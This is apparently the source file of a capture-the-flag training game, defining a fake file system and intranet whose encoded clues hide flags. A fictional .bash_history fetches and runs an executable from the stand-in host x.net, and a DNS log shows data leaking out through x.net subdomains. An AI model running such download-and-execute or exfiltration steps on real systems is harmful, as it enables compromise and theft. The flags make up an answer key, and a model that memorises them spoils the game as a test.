// The fake file system and the lab intranet, holding every clue from the game design doc.
// A few clue texts contain a flag in readable form; they are stored base64-encoded so a quick
// search of the source doesn't give the answers away. shortcut: obscure, not secret — anyone
// who decodes the source can read them; that's the accepted trade-off for a static game.
import type { Category } from '../../game/challenges.ts';
import { recoveredFragments, type GameState } from '../../game/engine.ts';

export type FileNode = {
  kind: 'file';
  name: string;
  /** Names starting with a dot are hidden from plain `ls`. */
  text: string | ((state: GameState) => string);
  /** Binary files print noise with `cat`; `strings` keeps the readable runs. */
  binary?: boolean;
  /** Photo properties, shown by `exif`. */
  exif?: [string, string][];
  /** The challenge this file is the clue for, e.g. crypto/01. */
  challenge?: string;
};

export type DirNode = {
  kind: 'dir';
  name: string;
  /** A challenge folder: closed until its category unlocks. */
  category?: Category;
  children: Node[];
};

export type Node = FileNode | DirNode;

const decoded = (b64: string) => atob(b64);

/** A deterministic memory dump: symbol noise with readable runs no longer than 4, except two. */
function memoryDump(): string {
  let seed = 7;
  const random = () => {
    seed = (seed * 1103515245 + 12345) % 2147483648;
    return seed / 2147483648;
  };
  const symbols = '▒░▓¤§¶×÷¦µ¬°±';
  const ascii = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const noise = (length: number) => {
    let out = '';
    while (out.length < length) {
      out += symbols[Math.floor(random() * symbols.length)];
      const run = Math.floor(random() * 5);
      for (let i = 0; i < run; i++) out += ascii[Math.floor(random() * ascii.length)];
    }
    return out.slice(0, length);
  };
  const lines = Array.from({ length: 40 }, () => noise(48));
  lines[12] = `${noise(10)}▓gw_sync.exe▓${noise(25)}`;
  lines[27] = `${noise(6)}¤${decoded('RkxBR3tzdHIxbmdzX2YxbmRfdGhlX3MxZ25hbH0=')}¤${noise(10)}`;
  return lines.join('\n');
}

function notes(state: GameState): string {
  const recovered = recoveredFragments(state);
  const lines = Array.from({ length: 10 }, (_, i) =>
    i < recovered.length
      ? `[${i + 1}] ${recovered.at(i)}`
      : `[${i + 1}] ▒▒▒▒▒▒▒▒▒▒▒▒ (recover a flag to restore this line)`,
  );
  return ['notes.txt: sysad_07, 2024-03-14', '', ...lines].join('\n');
}

export const root: DirNode = {
  kind: 'dir',
  name: '~',
  children: [
    {
      kind: 'file',
      name: 'readme.txt',
      text: [
        "This machine was wiped on 2024-03-14 at 23:58. Ten fragments of the admin's notes survived.",
        'Each flag you find, FLAG{...}, recovers one fragment and repairs part of the machine.',
        '',
        'Start in crypto/. Type help for every command, and status to see your progress.',
      ].join('\n'),
    },
    { kind: 'file', name: 'notes.txt', text: notes },
    {
      kind: 'dir',
      name: 'crypto',
      category: 'crypto',
      children: [
        {
          kind: 'file',
          name: '01_caesar.txt',
          challenge: 'crypto/01',
          text: 'Qrwh wr vhoi: wkh urrp qdph lv wkh nhb. IODJ{z3of0ph_w0_ode_v3yhq}',
        },
        {
          kind: 'file',
          name: '02_backup.b64',
          challenge: 'crypto/02',
          text: 'RkxBR3tiNHNlNjRfaXNfbjB0X2VuY3J5cHQxMG59',
        },
        {
          kind: 'file',
          name: '03_vigenere.txt',
          challenge: 'crypto/03',
          text: 'QLBY{xci_olclmt_ref_l_tsst}\n\nkey: the room name',
        },
      ],
    },
    {
      kind: 'dir',
      name: 'web',
      category: 'web',
      children: [
        {
          kind: 'file',
          name: 'README.txt',
          text: 'The lab intranet still answers at lab07.local.\nTry: curl lab07.local/admin',
        },
      ],
    },
    {
      kind: 'dir',
      name: 'forensics',
      category: 'forensics',
      children: [
        {
          kind: 'file',
          name: 'lab_photo.jpg',
          challenge: 'forensics/01',
          binary: true,
          text: 'ÿØÿà JFIF ▒▓░ (an image: a desk with a sticky note; try exif lab_photo.jpg)',
          exif: [
            ['Taken', '2024-03-14 23:41'],
            ['Camera', 'Lab webcam'],
            ['Description', 'Desk with a sticky note, nobody in the room'],
            ['Comment', 'RkxBR3tleDFmX3JlbWVtYmVyc19ldmVyeXRoMW5nfQ=='],
          ],
        },
        {
          kind: 'file',
          name: 'memory.dmp',
          challenge: 'forensics/02',
          binary: true,
          text: memoryDump(),
        },
        {
          kind: 'file',
          name: '.bash_history',
          challenge: 'forensics/03',
          text: [
            'cd /tmp',
            'wget http://x.net/gw_sync.exe',
            'chmod +x gw_sync.exe',
            './gw_sync.exe --quiet &',
            'echo "}yrotsih_ruoy_raelc_syawla{GALF" > /tmp/.x',
            'exit',
          ].join('\n'),
        },
      ],
    },
    {
      kind: 'dir',
      name: 'network',
      category: 'network',
      children: [
        {
          kind: 'file',
          name: 'dns.log',
          challenge: 'network/01',
          text: [
            'time   source      query',
            '23:48  10.0.7.12   lab07.local',
            '23:49  10.0.7.12   auth.lab07.local',
            '23:50  10.0.7.12   update.lab07.local',
            '23:50  10.0.7.21   printer.lab07.local',
            '23:51  10.0.7.12   lab07.local',
            '23:52  10.0.7.66   IZGECR33MRXHGXZR.x.net',
            '23:52  10.0.7.21   printer.lab07.local',
            '23:53  10.0.7.66   ONPWCX3MMVQWW6K7.x.net',
            '23:53  10.0.7.12   time.lab07.local',
            '23:54  10.0.7.66   OAYXAZL5.x.net',
            '23:55  10.0.7.12   lab07.local',
            '23:56  10.0.7.21   printer.lab07.local',
          ].join('\n'),
        },
        {
          kind: 'file',
          name: 'access.log',
          challenge: 'network/02',
          text: [
            'time   source      request                        status',
            '23:45  10.0.7.12   GET /admin                     200',
            '23:46  10.0.7.12   GET /old.html                  404',
            '23:50  10.0.7.21   GET /robots.txt                200',
            '23:55  10.0.7.66   GET /staff-backup/             200',
            '23:57  10.0.7.66   POST /upload?q=data%3D464c41477b6768307374773172655f6c30636b65645f3075747d%26note%3Dbye  403',
            '23:58  10.0.7.12   GET /admin                     503',
          ].join('\n'),
        },
      ],
    },
  ],
};

/** The lab intranet, reached with `curl lab07.local/<path>` once web/ is open. */
export const intranet: Record<string, string> = {
  '/': 'Lab 07 intranet.\nPages: /admin',
  '/admin': [
    '<!doctype html>',
    '<html>',
    '  <body>',
    '    <h1>Admin login</h1>',
    '    <form action="/login">user <input name="u"> pass <input name="p" type="password"></form>',
    '    <!-- old login moved to /old.html, delete before term ends -->',
    '  </body>',
    '</html>',
  ].join('\n'),
  '/old.html': decoded(
    'PCFkb2N0eXBlIGh0bWw+CjxodG1sPgogIDxib2R5PgogICAgPCEtLSBGTEFHe2MwbW1lbnRzX2FyZV9wdWJsMWN9IC0tPgogIDwvYm9keT4KPC9odG1sPg==',
  ),
  '/robots.txt': 'User-agent: *\nDisallow: /staff-backup/',
  '/staff-backup/': 'Index of /staff-backup/\n  README.txt\n  backup_2024-03-14.tar   0 bytes',
  '/staff-backup/README.txt': decoded(
    'U3RhZmYgYmFja3VwIG5vdGVzCkRvIG5vdCBsZXQgc2VhcmNoIGVuZ2luZXMgaW5kZXggdGhpcyBmb2xkZXIuCkZMQUd7cjBib3RzX3R4dF9pc19hX21hcH0=',
  ),
};

export const readText = (file: FileNode, state: GameState) =>
  typeof file.text === 'function' ? file.text(state) : file.text;

/** Runs of 6+ printable ASCII characters, like the Unix `strings` command. */
export const extractStrings = (text: string) => text.match(/[\x20-\x7e]{6,}/g) ?? [];

/** The clue files in a challenge folder; hidden ones only when asked. */
export function filesIn(category: Category, { hidden = false } = {}): FileNode[] {
  const folder = root.children.find((c) => c.kind === 'dir' && c.category === category) as DirNode;
  return folder.children.filter(
    (f): f is FileNode => f.kind === 'file' && (hidden || !f.name.startsWith('.')),
  );
}

/**
 * Looks up an intranet address like lab07.local/admin (with or without http://).
 * Returns the page, 'not-found' for a missing page, or 'no-host' for any other host.
 */
export function pageAt(address: string): string | 'not-found' | 'no-host' {
  const match = address
    .trim()
    .replace(/^https?:\/\//, '')
    .match(/^lab07\.local(\/.*)?$/);
  if (!match) return 'no-host';
  return intranet[match[1] || '/'] ?? 'not-found';
}
